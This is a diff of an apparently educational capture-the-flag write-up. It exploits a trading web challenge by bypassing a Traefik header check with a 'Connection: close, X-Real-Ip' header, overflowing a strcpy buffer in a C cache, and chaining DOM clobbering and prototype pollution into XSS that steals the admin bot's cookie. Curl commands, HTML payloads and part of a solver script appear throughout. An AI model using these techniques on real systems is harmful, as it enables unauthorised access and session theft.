@@ -393,7 +393,7 @@ def bot_runner(config):
 	client.quit()
 ```
 
-We do not really care about the Chrome arguments here [(although they are sometimes crucial to the solution)](/posts/hack-my-bot-pwnme-2025-ctf/#chapter-4-bot-control), we care about the bot's flow.
+We do not really care about the Chrome arguments here [(although they are sometimes crucial to the solution)](/posts/hack-my-bot-pwnme-2025-ctf/#chapter-4-bot-control), we mainly care about the bot's flow.
 
 The bot logs in, checks his trades at `/my_trades` for 10 seconds before finally leaving.
 
@@ -541,7 +541,7 @@ I found it suspicious that the author chose two separate protection mechanisms b
 
 If we look closely, we will notice that `token_required()` contains a kill switch. The function checks for the existence of the `X-Real-Ip` header, if it doesn't exist, the middleware lets go.
 
-But where is `X-Real-Ip` being set anyways? It seems like `traefik` is setting for Flask, let's patch our app locally to confirm this. We will add a line on `@web.after_request` to print received headers:
+But where is `X-Real-Ip` being set anyways? It seems like `traefik` is passing it to Flask, let's patch our app locally to confirm this. We will add a line on `@web.after_request` to print received headers:
 ```python
 @web.after_request
 def apply_csp(response):
@@ -571,7 +571,7 @@ X-Forwarded-Server: a477f169e095
 X-Real-Ip: 127.0.0.1
 ```
 
-Notice that since `traefik` is now sitting in front of Flask, it appends a couple of `X-*` headers to tell Flask what the original IP of the request was.
+Notice that since `traefik` is sitting in front of Flask, it appends a couple of `X-*` headers to tell Flask what the original IP of the request was; this prevents the reverse proxy from masking original user.
 
 A request sent to Flask internally, say using `curl` for example and not through `traefik`, does not include these `X-*` headers:
 ```http
@@ -627,7 +627,7 @@ We send a request to demonstrate the vulnerability:
 curl http://localhost:1337/ -H "Connection: close, X-Real-Ip"
 ```
 
-And we notice that we do on the other end, `X-Real-Ip` got dropped:
+And we notice that now on the other end, `X-Real-Ip` got dropped:
 ```http
 Received Headers:
 Host: 127.0.0.1:1337
@@ -640,7 +640,7 @@ X-Forwarded-Proto: http
 X-Forwarded-Server: a477f169e095                       
 ```
 
-Brilliant! A follow up request confirms that we have, indeed, bypassed the API access control:
+Brilliant! A follow up request to `/api/trades` confirms that we have, indeed, bypassed the API access control:
 ```
  curl http://94.237.122.124:47098/api/trades -H "Connection: close, X-Real-Ip"
 {"trades":[]}
@@ -684,7 +684,7 @@ Before we do that, let's check out how data flows to the `/my_trades` page which
 
 Needless to say, the three properties, `action`, `price` and `symbol` are not sanitized giving us an HTML injection vector if we can control them.
 
-Let's see where the trades come from.
+Let's see where they come from.
 
 2. The request is handled by `/my_trades` in `web.py`:
 ```python
@@ -865,7 +865,7 @@ get signal:24c9fd30-9a88-421e-a65b-eabb2938d457
 symbol|TSLA|action|buy|price|761.01
 ```
 
-Interesting, so we have a bunch of signals, and we can read some of them. Let's try to copy a signal and see what happens:
+Interesting. So we have a bunch of signals, and we can read some of them. Let's try to copy a signal and see what happens:
 ```bash
 curl http://localhost:1337/api/copy_signal_trade \
 	-H "Connection: close, X-Real-Ip" \
@@ -910,7 +910,7 @@ user:sys_admin:trade:b0edd7e4-c6b8-46ea-9595-b58d5bf41617
 user:1:trade:d3c562c3-d575-45e9-922f-0ee9693d16d8
 ```
 
-Aha! As we can see the admin account has `user_id` of 1. The `/api/trades` endpoint we saw earlier filtered trades based on the `user_id`:
+Aha! As we can see a difference. The admin account has `user_id` of 1. The `/api/trades` endpoint we saw earlier filtered trades based on the `user_id`:
 ```python
 user_id = g.user.id if g.get("user") else "sys_admin"
 # --- redacted ---
@@ -918,7 +918,7 @@ user_id = g.user.id if g.get("user") else "sys_admin"
 	# --- redacted ---
 ```
 
-It turns out, because we accessed the API unconventionally via a Traefik bypass, we do not have a "real" user session since we bypassed the `token_required` which queried and linked us with our respective `user_id`:
+It turns out, because we accessed the API unconventionally using our Traefik bypass, we are not given a "real" user session. This is because we bypassed `token_required` which queried and linked us with our respective `user_id`:
 ```python
         db_session = Database()
         valid, user = db_session.validate_token(token)
@@ -928,13 +928,13 @@ It turns out, because we accessed the API unconventionally via a Traefik bypass,
         g.user = user
 ```
 
-So even though we have full access to the API, we are given a fallback `sys_admin` user, which cannot make requests on behalf of the bot's admin user which has `user_id` 1.
+So even though we have full access to the API, we are given a fallback `sys_admin` user, which cannot make requests on behalf of the bot's admin user with `user_id` = 1.
 
-This is a bummer! How will we write trades that can poison another user's feed now?
+This is a bummer! How will we write trades that can poison bot's feed now?
 
-Wait... There is still a very critical part of the application that we have not explored yet. The `aetherCache` key store!
+Going back to the drawing board, we identify a very critical part of the application that we have not explored yet. The `aetherCache` key store!
 
-Let's inspect `cache/aetherCache.c`:
+Let's inspect `cache/aetherCache.c`. A quick look at variable declarations:
 ```c
 #define BUFFER_SIZE 1024
 #define KEY_SIZE 256
@@ -950,7 +950,7 @@ Entry entries[MAX_ENTRIES];
 int entry_count = 0;
 ```
 
-It is very interesting that they have fixed `KEY_SIZE` and `VALUE_SIZE` equal to 256 bytes. Let's see how keys are set:
+It is very interesting that they have fixed `KEY_SIZE` and `VALUE_SIZE` equal to 256 bytes. Fixed size buffers are problematic if not handled properly. Let's see how keys are set:
 ```c
 void set(const char *key, const char *value) {
     pthread_mutex_lock(&entry_mutex);
@@ -976,11 +976,11 @@ void set(const char *key, const char *value) {
 }
 ```
 
-Interestingly, the developer took great care to make sure `set` operations are synchronized using `pthread_mutex_lock` and `pthread_mutex_unlock`. However, a quick look at how the new value is set, we find the disastrous usage of `strcpy(entries[i].value, value)`.
+Interestingly, the developer took great care to make sure `set` operations are synchronized using `pthread_mutex_lock` and `pthread_mutex_unlock`. However, a look at how the new value is set, we find the disastrous usage of `strcpy(entries[i].value, value)`.
 
-We all know that `strcpy` is an unsafe function that does not check bounds. In this case, supplying a value larger than 256 will lead to a stack-based buffer overflow that will overwrite the key of the next entry!
+We all know that `strcpy` is an unsafe function that does not check bounds. In this case, supplying a value larger than 256 will lead to a stack-based buffer overflow that can overwrite the key of the next entry!
 
-To confirm this, let's try something fun:
+To confirm this, let's try something fun. Let's first check the cache:
 ```bash
 list
 signal:17bb0ffc-5b96-44f3-8e86-ec104e68b5df
@@ -992,7 +992,7 @@ user:sys_admin:trade:b0edd7e4-c6b8-46ea-9595-b58d5bf41617
 user:1:trade:d3c562c3-d575-45e9-922f-0ee9693d16d8
 ```
 
-We know that on the stack, our two trades are placed like this:
+We can imagine how that looks like on the stack, our two trade entries would be placed like this:
 ```c
 // entry 1
 /*    key : 256 bytes    */
@@ -1090,7 +1090,7 @@ def edit_trade():
 
 We can supply a JSON object with either `symbol`, `action` or `price` and it will format it correctly and send a `set` command to the underlying vulnerable cache!
 
-Precise exploitation of this vector will be needed when we write our script, for now it's enough to know that we can modify the admin account's trades. On to the HTML injection
+Precise exploitation of this vector will be needed when we come to writing our solver, for now it's enough to know that we can modify the admin account's trades. On to the HTML injection
 
 ## Chapter 5: Everybody Gets a Clobber!
 
@@ -1098,7 +1098,7 @@ As we saw in the last chapter, we identified a stack-based buffer overflow in th
 
 Since trades are reflected, sans-sanitization on the **My Trades** page, we can perform XSS! Or can we?
 
-A quick look at the app shows us that it is using XSS' top nemesis: **Content Security Policy**.
+A quick look at the app shows us that it is using XSS' top nemesis: [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP).
 ```python
 @web.before_request
 def before_request():
@@ -1118,6 +1118,8 @@ Inspecting the site, we find a custom JS file imported in all dashboard pages:
 ```html
 <script src="/static/js/dashboard.js" nonce="3729df3f7380d660e87420775de5a8bc"></script>
 ```
+
+If we can find a vulnerability in this script that would allow us to execute our own code, we may be able to achieve XSS.
 
 Let's inspect it:
 ```js
@@ -1200,21 +1202,21 @@ window.onload = () => {
 This Javascript piece has lots going on, but it's quite simple once we trace it step-by-step. I traced it in reverse, starting from the `eval` function which would give us client-side execution:
 
 Take a deep breath, and let's say it in one go:
-> To get XSS we need to control `configKeysLength` which is equal to `logData.config.length` which succeeds a deep merge between `logData` and `data` which is received from a call to the `/front_end_error/new/` at the `LOG_LEVEL.attributes.int.nodeValue` log level. All of this requires `window.UI_DEV_MODE` to be set and requires an error to be trigger in the wrapping `try` block.
+> To get XSS we need to control `configKeysLength` which is equal to `logData.config.length` which succeeds a recursive merge between `logData` and `data` which is received from a call to the `/front_end_error/new/` at the `LOG_LEVEL.attributes.int.nodeValue` log level. All of these requires `window.UI_DEV_MODE` to be set and requires an error to be triggered in the wrapping `try` block.
 
-How can we achieve all of that? This took some time and experimentation, but let's do a forward pass through it
+How can we achieve all of that? This took some time and experimentation, but let's do a forward pass through it:
 
-1. First, we can trigger an error within the `try {}` block by clobbering `document.getElementById`. This can be achieved using `<img name=getElementById>` (Yea, I also didn't know)
+1. First, we can trigger an error within the `try {}` block by [DOM clobbering](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-clobbering.html) `document.getElementById`. This can be achieved using `<img name=getElementById>` (Yea, I also didn't know)
 2. Once within the `catch {}` block, we can satisfy the `if` condition by clobbering `window.UI_DEV_MODE`. This can be achieved using `<a id=UI_DEV_MODE>`
 3. Once we get to the `fetch`, we easily make it return our own user-controlled JSON payload by accessing our same-site read-write primitive found earlier at `/front_end_error/view/pollution`. This can be achieved via DOM clobbering to path traversal using `<a id=LOG_LEVEL int='../view/pollution'>`
 4. Once we are at `merge(logData, data)`, we can pollute the `.length` parameter with our final XSS by sending a JSON object like `{"__proto__": {"length": "alert(document.origin)//"}}`
 
-Which looks like this:
+The data flow looks like this:
 ![](xss_data_flow.png)
 
-Essentially, once all constraints are in place, our XSS payload will be delivered via our read-write primitive found earlier.
+Essentially, once all constraints are in place, our XSS payload will be delivered via our read-write primitive found earlier and get executed.
 
-Our payload can also use the same read-write primitive to exfiltrate the bot's admin non-HttpOnly cookie since the primitive is same-site. If this wasn't available, a simple `window.href` redirect is also valid exfiltration method since top-level navigations are not prone to CSP.
+Our payload can also use the same read-write primitive to exfiltrate the bot's admin non-HttpOnly cookie since the primitive is same-site. If this wasn't available, a simple `window.href` redirect is also a valid exfiltration method since top-level navigations are not prone to CSP.
 
 > *Note: The final payload and how everything will be glued together is part of the last chapter where we automate this whole chain.*
 
@@ -1556,6 +1558,13 @@ We need to copy any active signal, I will be using the first one and copy it unt
 while len(trades := api.get("/api/trades").json()["trades"]) < 2:
     r = api.post("/api/copy_signal_trade", json=dict(signal_id=signal_key))
 ```
+
+It is important to copy two trades because **aetherCache** keeps an integer `entry_count` that only gets incremented when we legitimately set a new key:
+```c
+int entry_count = 0;
+```
+
+Since it is also on the stack, we technically could overflow it too; however it is much simpler to just make two trades and overflow the first into the second.
 
 We can then edit the first of the two trades to overflow it onto the second. This part is tricky as we need to craft a precise payload with all paddings calculated precisely:
 ```python
